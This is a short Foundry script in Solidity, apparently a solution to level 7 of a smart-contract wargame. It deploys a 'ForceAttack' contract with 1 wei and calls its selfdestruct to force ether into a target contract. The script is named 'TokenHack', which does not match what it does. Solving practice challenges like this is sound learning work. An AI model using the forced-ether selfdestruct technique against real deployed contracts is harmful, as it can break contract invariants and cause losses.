// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level07.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

        ForceAttack forceAttackInstance = new ForceAttack{value: 1 wei}();
        forceAttackInstance.selfdestruct_contract();

        vm.stopBroadcast();
    }
}